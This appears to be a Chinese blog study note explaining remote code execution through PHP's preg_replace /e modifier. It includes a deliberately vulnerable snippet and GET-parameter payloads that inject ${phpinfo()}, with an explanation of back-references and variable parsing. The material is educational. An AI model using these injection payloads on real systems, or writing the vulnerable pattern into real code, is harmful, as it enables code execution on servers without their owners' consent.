---
title: preg_replace与代码执行
comments: true
hide: false
date: 2020-12-10 13:53:27
urlname: preg_replace
updated:
permalink:
tags:
  - PHP
categories:
  - 杂谈笔记
  - 学习笔记
---

参考文章链接： https://xz.aliyun.com/t/2557 



<!-- more -->

#  preg_replace与代码执行 

 **preg_replace** **/e** 模式下的代码执行问题 

```php
function complex($re, $str) {
    return preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str);
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
```

 **preg_replace** 使用了 **/e** 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。 

 **preg_replace** 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 **preg_replace** 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 **'strtolower("\\1")'** 字符串.

上面的命令执行，相当于 **eval('strtolower("\\1");')** 结果，当中的 **\\1** 实际上就是 **\1** ，而 **\1** 在正则表达式中有自己的含义。

> **反向引用**
>
> 对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

 **payload** 为： **/?.\*={${phpinfo()}}** ，即 **GET** 方式传入的参数名为 **/?.\*** ，值为 **{${phpinfo()}}** 。 

```
$re=.*
$str={${phpinfo()}}
原先的语句： preg_replace('/(' . $re . ')/ei', 'strtolower("\\1")', $str);
变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});
```

---

 由于在PHP中，对于传入的非法的 **$_GET** 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。 

 当非法字符为首字母时，只有点号会被替换成下划线，所以我们要做的就是换一个正则表达式，让其匹配到 **{${phpinfo()}}** 即可执行 **phpinfo** 函数。**payload** ： **\S\*=${phpinfo()}** 

 为什么要匹配到 **{${phpinfo()}}** 或者 **${phpinfo()}** ，才能执行 **phpinfo** 函数，这是一个小坑。这实际上是 [PHP可变变量](http://php.net/manual/zh/language.variables.variable.php) 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 **${phpinfo()}** 中的 **phpinfo()** 会被当做变量先执行，执行后，即变成 **${1}** (phpinfo()成功执行返回true)。 





文章链接： https://xz.aliyun.com/t/2557 